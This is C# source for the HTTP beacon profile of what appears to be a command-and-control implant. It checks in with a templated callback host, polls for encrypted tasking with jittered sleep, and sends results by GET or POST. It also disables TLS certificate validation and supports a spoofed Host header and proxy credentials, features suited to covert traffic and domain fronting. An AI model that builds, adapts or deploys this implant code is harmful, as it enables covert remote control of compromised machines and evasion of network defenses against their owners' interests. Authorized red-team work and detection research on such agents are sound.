using Agent.Interfaces;
using Agent.Models;
using System.Net;
using Agent.Utilities;
using System.Net.Security;
using System.Text.Json;

namespace Agent.Profiles
{
    public class HttpProfile : IProfile
    {
        public IAgentConfig agentConfig { get; set; }
        public ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private string userAgent { get; set; }
        private string hostHeader { get; set; }
        private string getURL { get; set; }
        private string postURL { get; set; }
        private string proxyHost { get; set; }
        private string proxyPass { get; set; }
        private string proxyUser { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private HttpClient _client { get; set; }

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;

        public HttpProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            HttpClientHandler handler = new HttpClientHandler();
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            int callbackPort = Int32.Parse("callback_port");
            string callbackHost = "callback_host";
            string getUri = "get_uri";
            string queryPath = "query_path_name";
            string postUri = "post_uri";
            this.userAgent = "%USERAGENT%";
            this.hostHeader = "%HOSTHEADER%";
            this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
            this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";

            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this._client = new HttpClient(handler);

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this._client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this._client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            //%CUSTOMHEADERS%
        }


        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                if (!string.IsNullOrEmpty(res))
                {
                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                try
                {
                    string responseString = await this.Send(await messageManager.GetAgentResponseStringAsync());

                    if (String.IsNullOrEmpty(responseString))
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr == null)
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    this.currentAttempt = 0;

                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                    this.SetTaskingReceived(null, tra);
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }
        internal async Task<string> Send(string json)
        {
            try
            {
                //This will encrypted if AES is selected or just Base64 encode if None is referenced.
                json = this.crypt.Encrypt(json);


                HttpResponseMessage response;

                if (json.Length < 2000) //Max URL length
                {
                    response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
                }
                else
                {
                    response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
                }

                string strRes = await response.Content.ReadAsStringAsync();

                //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
                return this.crypt.Decrypt(strRes);
            }
            catch
            {
                return String.Empty;
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();

            return true;
        }
    }
}
